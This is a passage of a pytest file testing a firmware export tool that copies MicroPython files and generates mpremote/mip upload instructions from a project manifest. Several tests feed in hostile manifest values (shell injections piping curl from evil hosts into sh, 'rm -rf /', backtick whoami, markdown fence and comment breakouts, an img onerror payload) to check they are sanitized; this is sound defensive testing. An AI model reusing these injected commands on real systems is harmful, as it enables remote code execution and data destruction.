    assert result["status"] == "error"
    assert result["error_kind"] == "export_rollback_failed", "not the generic swap failure, and not an escaped OSError"
    backup = project / "upload_ready.previous"
    assert result["path"] == str(backup), "the result names where the folder actually is"
    assert "upload_ready" in result["message"], "and the message says what to do about it"
    assert (backup / "main.py").exists(), "the user's complete export still exists, under the backup name"


def test_export_upload_ready_cleanup_failure_does_not_mask_the_real_error(monkeypatch, tmp_path):
    """Cleanup runs on an already-failing path. An rmtree error there would replace the real
    diagnosis with a confusing one about a scratch directory."""
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())

    import serve
    real_copy2 = serve.shutil.copy2

    def failing_copy2(src, dst, *args, **kwargs):
        raise OSError(28, "No space left on device")

    def failing_rmtree(path, *args, **kwargs):
        raise OSError(13, "Permission denied")

    monkeypatch.setattr(serve.shutil, "copy2", failing_copy2)
    monkeypatch.setattr(serve.shutil, "rmtree", failing_rmtree)
    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "error"
    assert result["error_kind"] == "export_write_failed", "the copy failure is what gets reported"
    assert "No space left" in result["message"]


def test_export_upload_ready_reports_ok_when_only_the_backup_cleanup_fails(monkeypatch, tmp_path):
    """Both renames have succeeded by then, so upload_ready/ is complete and installed.
    Dropping the backup is housekeeping: failing the whole export over it would tell the
    user their export failed and send them to retry something that already worked."""
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    assert _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})["status"] == "ok"

    import serve
    real_rmtree = serve.shutil.rmtree

    def rmtree_failing_only_on_the_backup(path, *args, **kwargs):
        if str(path).endswith("upload_ready.previous"):
            raise OSError(13, "Permission denied")
        return real_rmtree(path, *args, **kwargs)

    monkeypatch.setattr(serve.shutil, "rmtree", rmtree_failing_only_on_the_backup)
    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok", "a housekeeping failure is not an export failure"
    assert result["file_count"] == 5, "the export really was installed"
    assert (project / "upload_ready" / "main.py").exists()
    # Reported, not swallowed: it is a real directory the user may want to remove.
    assert result["leftover"] == str(project / "upload_ready.previous")


def test_export_upload_ready_leaves_no_scratch_directories_behind(tmp_path):
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})  # regenerate

    siblings = {p.name for p in project.iterdir() if p.is_dir()}
    assert "upload_ready.staging" not in siblings
    assert "upload_ready.previous" not in siblings, "the old tree is dropped once the swap succeeds"


def test_export_upload_ready_clears_a_leftover_staging_tree_from_an_interrupted_run(tmp_path):
    """A killed process can leave staging behind. It is scratch the export owns, so the
    next run reclaims it rather than failing or, worse, merging into it."""
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    staging = project / "upload_ready.staging"
    staging.mkdir()
    (staging / "junk_from_a_dead_run.py").write_text("x", encoding="utf-8")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok"
    assert not staging.exists()
    assert not (project / "upload_ready" / "junk_from_a_dead_run.py").exists(), "the leftover never leaks into the export"


def test_export_upload_ready_refuses_a_symlink_planted_at_the_scratch_paths(tmp_path):
    """Same reasoning as the export path itself: this routine rmtree-s the scratch dirs,
    so a symlink there would delete whatever it points at."""
    for scratch_name in ("upload_ready.staging", "upload_ready.previous"):
        project = _build_upload_ready_project(tmp_path / scratch_name, manifest=_two_mip_manifest())
        outside = tmp_path / f"outside-{scratch_name}"
        outside.mkdir()
        (outside / "keep.txt").write_text("precious", encoding="utf-8")
        try:
            os.symlink(str(outside), str(project / scratch_name), target_is_directory=True)
        except (OSError, NotImplementedError):
            pytest.skip("symlink creation requires privilege on this platform")

        result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

        assert result["status"] == "error", scratch_name
        assert result["error_kind"] == "export_dir_is_symlink", scratch_name
        assert (outside / "keep.txt").exists(), f"{scratch_name}: the symlink target is untouched"


def test_export_upload_ready_copies_firmware_excluding_mocks_pycache_gitkeep_and_siblings(tmp_path):
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok"
    export_dir = project / "upload_ready"
    rels = set()
    for root, _dirs, files in os.walk(export_dir):
        for name in files:
            rels.add(os.path.relpath(os.path.join(root, name), export_dir).replace("\\", "/"))
    # Mocks, __pycache__, .gitkeep, and the sibling tools/ + test/pc/ trees never appear.
    # firmware/README.md (a legitimate device file) is preserved AS README.md, so the
    # generated mip-instructions doc lands at the fallback name instead.
    assert rels == {"main.py", "boot.py", "README.md", "lib/a.py", "drivers/foo_driver/__init__.py", "UPLOAD_INSTRUCTIONS.md"}
    assert result["file_count"] == 5  # firmware copies only; UPLOAD_INSTRUCTIONS.md is generated separately
    assert result["mip_count"] == 2
    assert result["path"] == str(export_dir)
    assert (export_dir / "README.md").read_text(encoding="utf-8") == "device notes", "the device's own README survives byte-for-byte"


def test_export_upload_ready_readme_lists_pinned_and_latest_mip_installs(tmp_path):
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    # firmware/README.md exists in this fixture, so the generated instructions land at
    # the fallback name (see the fallback-name test) rather than clobbering it.
    readme = (project / "upload_ready" / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8")
    assert "mip install aht20@1.0.0" in readme  # pinned version appended
    assert "mip install aioble" in readme
    assert "aioble@latest" not in readme  # "latest" is never appended
    assert "extra.bin" in readme  # asset_files noted


def test_export_upload_ready_readme_says_no_packages_without_runtime_dependencies(tmp_path):
    project = _minimal_firmware_project(tmp_path / "project", manifest={"mcu": {"model": "ESP32-S3"}})

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    assert "No external packages required." in readme
    assert "mip install" not in readme


def test_export_upload_ready_readme_command_names_device_files_and_not_itself(tmp_path):
    """`./*` would upload the generated instructions file onto the device (it lives inside
    the folder the command runs from). Explicit names keep it on the PC -- and work as-is
    in PowerShell/cmd, which never expanded the glob for mpremote anyway."""
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8")
    assert "./*" not in readme
    prefix = "mpremote connect <port> fs cp -r "
    command = next(line for line in readme.splitlines() if line.startswith(prefix))
    assert command.endswith(" :")
    named = command[len(prefix):-2].split()
    # The fixture's device files, top level only -- and never the instructions file.
    assert named == ["README.md", "boot.py", "drivers", "lib", "main.py"]


def test_export_upload_ready_missing_manifest_says_unknown_not_no_deps(tmp_path):
    """A pre-manifest project may well import external packages; 'No external packages
    required.' is a claim the tool cannot make there. Say what is actually known."""
    project = _minimal_firmware_project(tmp_path / "project")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok", "a missing manifest stays a normal, exportable state"
    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    assert "No external packages required." not in readme
    assert "No project-manifest.json was found" in readme


def test_export_upload_ready_regeneration_removes_stale_files(tmp_path):
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
    export_dir = project / "upload_ready"
    stale = export_dir / "stale.py"
    stale.write_text("leftover", encoding="utf-8")
    (project / "firmware" / "lib" / "a.py").unlink()

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok"
    assert not stale.exists(), "a file that only ever existed in a PRIOR export must not survive regeneration"
    assert not (export_dir / "lib" / "a.py").exists(), "a source file deleted from firmware/ must vanish from the export too"


def test_export_upload_ready_non_utf8_manifest_reports_manifest_read_failed(tmp_path):
    """UnicodeDecodeError is a ValueError, so it is neither an OSError nor a
    JSONDecodeError: it used to escape the manifest handler and surface as a generic shim
    error. Nothing destructive has run at that point, so the export was always safe -- what
    was lost was the error KIND, and with it any chance of the UI explaining itself."""
    project = _minimal_firmware_project(tmp_path / "project")
    (project / "project-manifest.json").write_bytes(b"\xff\xfe{\x00b\x00a\x00d\x00")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "error"
    assert result["error_kind"] == "manifest_read_failed"
    assert not (project / "upload_ready").exists(), "the export never started, so nothing was destroyed"


def test_export_upload_ready_recovers_a_mip_version_with_stray_whitespace(tmp_path):
    """A trailing newline on version is a recoverable intent, not hostile input. Every
    sibling field is stripped; version being the exception is what let "1.3.4\\n" reach the
    charset at all. Strip it and emit the right command, rather than failing the charset and
    demoting a perfectly good package to an "install manually" bullet -- the canonical
    install_mip_dependencies.py does not even use version in its argv, so dropping the whole
    entry over one would be strictly worse than the reference behavior."""
    manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": " 1.3.4\n"}]}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    assert "mip install aioble@1.3.4" in readme, "the version is recovered, not discarded"
    assert "unrecognized package spec" not in readme, "and the package is not demoted to a bullet"
    for block in readme.split("```")[1::2]:
        for line in (l for l in block.splitlines() if l.strip()):
            assert line.startswith("mpremote "), f"stray line in a command block: {line!r}"


def test_export_upload_ready_rejects_a_hostile_mip_version_but_still_names_the_package(tmp_path):
    """Stripping recovers whitespace; the charset still gates everything else. A version
    carrying a shell metacharacter or an embedded newline cannot reach the fenced block a
    user is instructed to run, and the package is reported rather than silently vanishing."""
    for hostile in ("1.3.4; curl evil.sh | sh", "1.3.4\nrm -rf /", "1.3.4`whoami`"):
        manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": hostile}]}}
        project = _minimal_firmware_project(tmp_path / f"p{abs(hash(hostile))}", manifest=manifest)

        _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

        # No device README in this fixture, so the instructions keep the README.md name.
        readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
        # Positive assert: the entry is DEMOTED to a bullet, not dropped. Without this the
        # test would pass just as well if the whole manifest pipeline broke and produced
        # "No external packages required."
        assert "unrecognized package spec" in readme, hostile
        assert "aioble" in readme, f"{hostile}: the user is still told which package needs doing by hand"
        for block in readme.split("```")[1::2]:
            for line in (l for l in block.splitlines() if l.strip()):
                assert line.startswith("mpremote "), f"{hostile}: stray line in a command block: {line!r}"
                assert "curl" not in line and "rm -rf" not in line and "whoami" not in line, hostile


def test_export_upload_ready_malformed_json_manifest_errors_not_silently_no_deps(tmp_path):
    # A truncated write or a merge-conflict-marked manifest is invalid JSON, not a
    # missing file -- json.JSONDecodeError is a ValueError, not an OSError, so it must
    # be caught explicitly or it escapes both the ENOENT and the OSError handling.
    project = _build_upload_ready_project(tmp_path / "project")
    (project / "project-manifest.json").write_text("{not valid json", encoding="utf-8")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "error"
    assert result["error_kind"] == "manifest_read_failed"
    assert not (project / "upload_ready").exists()


def test_export_upload_ready_manifest_read_failure_errors_not_silently_no_deps(tmp_path):
    if sys.platform == "win32":
        pytest.skip("chmod(0o000) only sets read-only on Windows; the read succeeds and the premise never arises")
    project = _build_upload_ready_project(tmp_path / "project")
    manifest_path = project / "project-manifest.json"
    manifest_path.write_text("{}", encoding="utf-8")
    manifest_path.chmod(0o000)
    try:
        result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
    finally:
        manifest_path.chmod(0o644)  # restore so pytest's tmp_path cleanup can remove it

    assert result["status"] == "error"
    assert result["error_kind"] == "manifest_read_failed"
    assert not (project / "upload_ready").exists(), "an unreadable manifest must fail BEFORE the old export is touched"


def test_export_upload_ready_refuses_a_preexisting_symlink_export_dir_target_untouched(tmp_path):
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    outside = tmp_path / "outside-target"
    outside.mkdir()
    (outside / "keepme.txt").write_text("do not touch", encoding="utf-8")
    (project / "upload_ready").symlink_to(outside, target_is_directory=True)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "error"
    assert result["error_kind"] == "export_dir_is_symlink"
    assert (outside / "keepme.txt").exists(), "rmtree must never run through the symlink"
    assert (project / "upload_ready").is_symlink(), "the symlink itself is left in place, not replaced"


def test_export_upload_ready_refuses_a_preexisting_regular_file_at_the_export_path(tmp_path):
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    (project / "upload_ready").write_text("not a directory", encoding="utf-8")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "error"
    assert result["error_kind"] == "export_dir_not_a_directory"
    assert (project / "upload_ready").read_text(encoding="utf-8") == "not a directory", "the file is left untouched, not silently rmtree'd"


def test_export_upload_ready_accepts_a_bare_string_mip_entry(tmp_path):
    # mip[] entries are contract-legal as either a bare package-name string or an
    # object (upy-deploy-plugin's normalize_mip_entry accepts both); the export must
    # not crash on the string form after upload_ready/ has already been wiped.
    manifest = {"mcu": {"model": "ESP32"}, "generate": {"runtime_dependencies": {"mip": ["unittest"]}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok"
    assert result["mip_count"] == 1
    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    assert "mip install unittest" in readme


def test_export_upload_ready_dedups_the_string_and_object_forms_of_the_same_package(tmp_path):
    # verify_import must default to the SAME value (package.replace("-", "_")) in both
    # the bare-string and object normalization branches, or the two forms of the same
    # package fail to dedup and the README lists (and mip_count counts) it twice.
    manifest = {"generate": {"runtime_dependencies": {"mip": [
        {"package": "aioble", "verify_import": "aioble"},
        "aioble",
    ]}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["mip_count"] == 1
    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    assert readme.count("mip install aioble") == 1


def test_export_upload_ready_reads_top_level_runtime_dependencies_before_the_generate_fallback(tmp_path):
    # The canonical mip consumer (install_mip_dependencies.py) checks a TOP-LEVEL
    # runtime_dependencies first and falls back to generate.runtime_dependencies only
    # when that is absent. Reading only the nested location silently under-reports.
    manifest = {"mcu": {"model": "ESP32"}, "runtime_dependencies": {"mip": ["aioble"]}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["mip_count"] == 1
    assert "mip install aioble" in (project / "upload_ready" / "README.md").read_text(encoding="utf-8")


def test_export_upload_ready_unwraps_a_manifest_content_envelope(tmp_path):
    manifest = {"manifest_content": {"mcu": {"model": "ESP32"}, "generate": {"runtime_dependencies": {"mip": ["aioble"]}}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["mip_count"] == 1


def test_export_upload_ready_readme_never_embeds_an_unsafe_package_spec_verbatim(tmp_path):
    # A model-written manifest is untrusted: a package spec containing shell/markdown
    # metacharacters must never land inside the README's copy-paste command block.
    manifest = {
        "mcu": {"model": "ESP32"},
        "generate": {"runtime_dependencies": {"mip": [
            {"package": "aioble && curl http://evil/x | sh", "version": "latest"},
        ]}},
    }
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    # The raw spec is allowed to appear as INERT warning text (that is how the user is
    # told it was refused) but must never sit inside a ``` fenced block, i.e. never be
    # something a copy-paste of the README would run as a command.
    code_blocks = readme.split("```")[1::2]
    assert not any("curl" in block for block in code_blocks), "the unsafe spec must never land inside a runnable code block"
    assert "unrecognized package spec" in readme
    assert result["mip_count"] == 1  # still counted -- just not embedded as a runnable command


def test_export_upload_ready_readme_strips_a_comment_breakout_from_mcu_model(tmp_path):
    manifest = {"mcu": {"model": "ESP32 --> ## OWNED"}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    lines = readme.splitlines()
    mcu_line = next(line for line in lines if line.startswith("<!-- Board / MCU:"))
    # Exactly one "-->": the line's own legitimate closing delimiter. A second one from
    # the injected mcu.model would close the comment early, letting "## OWNED" render as
    # a real markdown heading instead of staying inert inside the comment.
    assert mcu_line.count("-->") == 1, mcu_line
    assert "## OWNED" not in lines, "the injected heading must never become its own rendered line"


def test_export_upload_ready_readme_strips_an_overlapping_comment_breakout(tmp_path):
    # A single non-looping .replace("-->", "") on "---->> ## OWNED" would leave "-->"
    # behind (the trailing two '-' plus '>' recombine into a fresh delimiter). Stripping
    # '<'/'>' entirely (rather than pattern-matching "-->") closes this without a loop --
    # a "-->" cannot exist at all once every '>' is gone.
    manifest = {"mcu": {"model": "ESP32 ---->> ## OWNED"}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    lines = readme.splitlines()
    mcu_line = next(line for line in lines if line.startswith("<!-- Board / MCU:"))
    assert mcu_line.count("-->") == 1, mcu_line
    assert "## OWNED" not in lines


def test_export_upload_ready_readme_strips_raw_html_from_manifest_strings(tmp_path):
    # '<'/'>' must never survive into the README as raw markup -- CommonMark passes
    # inline HTML through a plain bullet UNCHANGED, so an <img onerror=...> would render
    # as a live tag (not text) in a document headed "Generated by Blockless".
    manifest = {"generate": {"runtime_dependencies": {"mip": [
        {"package": "aht20", "target": "/lib<img src=x onerror=alert(1)>"},
    ]}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    # The header's own literal "<!--"/"-->" delimiters are expected; only the INJECTED
    # value's angle brackets must be gone -- it survives as inert text, tag stripped.
    assert "target: /libimg src=x onerror=alert(1)" in readme
    assert "<img" not in readme


def test_export_upload_ready_readme_rejects_an_unsafe_version_even_with_a_safe_package(tmp_path):
    # The charset guard originally validated only `package`; `version` was concatenated
    # unvalidated right next to it inside the same fenced command.
    manifest = {"generate": {"runtime_dependencies": {"mip": [
        {"package": "aht20", "version": "1.0 && curl http://evil/x | sh"},
    ]}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    code_blocks = readme.split("```")[1::2]
    assert not any("curl" in block for block in code_blocks)
    assert "unrecognized package spec" in readme
    assert result["mip_count"] == 1


def test_export_upload_ready_readme_sanitizes_target_verify_import_and_asset_files(tmp_path):
    # None of these sit inside a validated fenced command -- they render as a plain
    # markdown bullet -- so a newline + backtick pair could still open a FRESH fenced
    # block on the next line if left unsanitized.
    manifest = {"generate": {"runtime_dependencies": {"mip": [{
        "package": "aht20",
        "target": "/lib\n```\ncurl http://evil/x | sh\n```",
        "verify_import": "aht20\n```\ncurl http://evil/y | sh\n```",
        "asset_files": ["a.dat\n```\ncurl http://evil/z | sh\n```"],
    }]}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    code_blocks = readme.split("```")[1::2]
    assert not any("curl" in block for block in code_blocks), "target/verify_import/asset_files must never open their own fenced block"


def test_export_upload_ready_readme_sanitizes_the_echoed_spec_in_the_rejection_bullet(tmp_path):
    # The rejection branch itself renders the untrusted package spec as inline text --
    # a newline + backtick pair there could still open a fresh fenced block.
    manifest = {"generate": {"runtime_dependencies": {"mip": [
        {"package": "pkg\n```\ncurl http://evil/x | sh\n```"},
    ]}}}
    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)

    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
    code_blocks = readme.split("```")[1::2]
    assert not any("curl" in block for block in code_blocks), "the echoed rejected spec must never open its own fenced block"


def test_export_upload_ready_tolerates_malformed_manifest_shapes_without_crashing(tmp_path):
    # Each of these is a plausible corruption (a hand-edited or partially-written
    # manifest), never a crash after the destructive rmtree/copy phase.
    for manifest in (
        {"mcu": "ESP32"},                                                      # mcu is a string, not an object
        {"generate": {"runtime_dependencies": {"mip": "aioble"}}},             # mip is a string, not a list
        {"generate": {"runtime_dependencies": {"mip": [{"package": "x", "asset_files": [1, 2]}]}}},  # non-str asset_files items
        {"generate": {"runtime_dependencies": {"mip": [None, 42, {"package": ""}]}}},  # junk + empty-package entries
        {"generate": {"runtime_dependencies": {"mip": [{"package": "x", "verify_import": ["a", "b"]}]}}},  # verify_import is a list
        {"generate": {"runtime_dependencies": {"mip": [{"package": "x", "verify_import": {"m": "y"}}]}}},  # verify_import is a dict
    ):
        project_dir = tmp_path / f"project-{id(manifest)}"
        project = _minimal_firmware_project(project_dir, manifest=manifest)

        result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

        assert result["status"] == "ok", manifest


def test_export_upload_ready_readme_takes_a_fallback_name_when_firmware_ships_its_own_readme(tmp_path):
    # firmware/README.md is a legitimate, never-excluded device file (it is what
    # deploy_firmware_tree uploads) -- the generated mip instructions must not clobber
    # it, or the export stops being "folder == device image".
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    (project / "firmware" / "README.md").write_text("MY DEVICE README", encoding="utf-8")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok"
    export_dir = project / "upload_ready"
    assert (export_dir / "README.md").read_text(encoding="utf-8") == "MY DEVICE README", "the device's own README is preserved verbatim"
    instructions = (export_dir / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8")
    assert "mip install" in instructions


def test_export_upload_ready_readme_picks_a_further_fallback_when_upload_instructions_also_collides(tmp_path):
    # firmware/ can ship BOTH its own README.md and its own UPLOAD_INSTRUCTIONS.md --
    # the fallback-name search must keep going past the first fallback too, rather than
    # clobbering whichever file happens to occupy the first fallback name.
    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
    (project / "firmware" / "README.md").write_text("MY DEVICE README", encoding="utf-8")
    (project / "firmware" / "UPLOAD_INSTRUCTIONS.md").write_text("MY DEVICE UPLOAD NOTES", encoding="utf-8")

    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})

    assert result["status"] == "ok"
    export_dir = project / "upload_ready"
    assert (export_dir / "README.md").read_text(encoding="utf-8") == "MY DEVICE README"
    assert (export_dir / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8") == "MY DEVICE UPLOAD NOTES"
    instructions = (export_dir / "UPLOAD_INSTRUCTIONS (2).md").read_text(encoding="utf-8")
    assert "mip install" in instructions


class FakeSerial:
    def __init__(self, lines):
        self.lines = [f"{line}\n".encode() for line in lines]

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return None

    def readline(self):
        return self.lines.pop(0) if self.lines else b""


class ChunkedSerial:
    """Returns raw fragments (some without a trailing newline) to mimic a real
    serial port whose readline() times out mid-line."""

    def __init__(self, fragments):
        self.fragments = [fragment.encode() for fragment in fragments]

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return None

    def readline(self):
        return self.fragments.pop(0) if self.fragments else b""


def test_fs_remove_treats_an_absent_path_as_success(monkeypatch):
    # The deploy SKILL prescribes clean-before-upload over a fixed target list, so on a BLANK
    # board every target is absent. Erroring there made `rm` behave differently depending on
    # whether the device had been used before, and burned turns on a first deploy (each device
    # rm also costs a two-step user confirm). _uninstall_package and _fs_mkdir already treat
    # absent/EEXIST as success; this brings _fs_remove into line.
    import serve

    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 1, "", "no such file"))
    assert serve._fs_remove("COM3", ":/tasks") == {"status": "ok", "absent": True}

    # mpremote writes some rm errors to STDOUT rather than stderr, so an absent path reported
    # there must be read the same way. Mutation: drop `or r.stdout` and this call errors.
    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 1, "OSError: [Errno 2] ENOENT", ""))
    assert serve._fs_remove("COM3", ":/drivers")["status"] == "ok"

    # A real failure stays loud. Only the absent class is swallowed.
    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 1, "", "OSError: [Errno 13] EACCES"))
    denied = serve._fs_remove("COM3", ":/main.py")
    assert denied["status"] == "error" and denied["error_kind"] == "mpremote_error"
    assert "EACCES" in denied["message"]

    # A successful removal is unchanged, and carries no "absent" flag.
    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 0, "", ""))
    assert serve._fs_remove("COM3", ":/main.py") == {"status": "ok"}


def test_list_files_names_an_absent_path_without_faking_an_empty_listing(monkeypatch):
    # An absent directory is NOT an empty one, so this stays an error: returning {"files": []}
    # would be a fabricated listing, the bug class that once made generate wrongly bail to
    # analyze. What changes is that the caller can tell "not on the device" from "device is
    # broken" -- map_install_error buckets ENOENT into a generic kind, so a model listing a
    # directory on a blank board was told `runtime_error` and had to guess which it meant.
    import serve

    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 1, "", "no such file"))
    absent = serve._list_files("COM3", ":/tasks")
    assert absent["status"] == "error"
    assert absent["error_kind"] == "path_absent"
    assert "files" not in absent, "an absent path must not report a listing at all"

    # A device that is genuinely broken keeps its own kind, not path_absent.
    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 1, "", "could not enter raw repl"))
    broken = serve._list_files("COM3", ":/tasks")
    assert broken["status"] == "error" and broken["error_kind"] != "path_absent"

    # A genuinely EMPTY directory still lists as empty, and must not be confused with absent.
    monkeypatch.setattr(serve, "_run_mpremote",
                        lambda args, timeout=30: subprocess.CompletedProcess(args, 0, "ls :/tasks\n", ""))
    assert serve._list_files("COM3", ":/tasks") == {"status": "ok", "files": []}
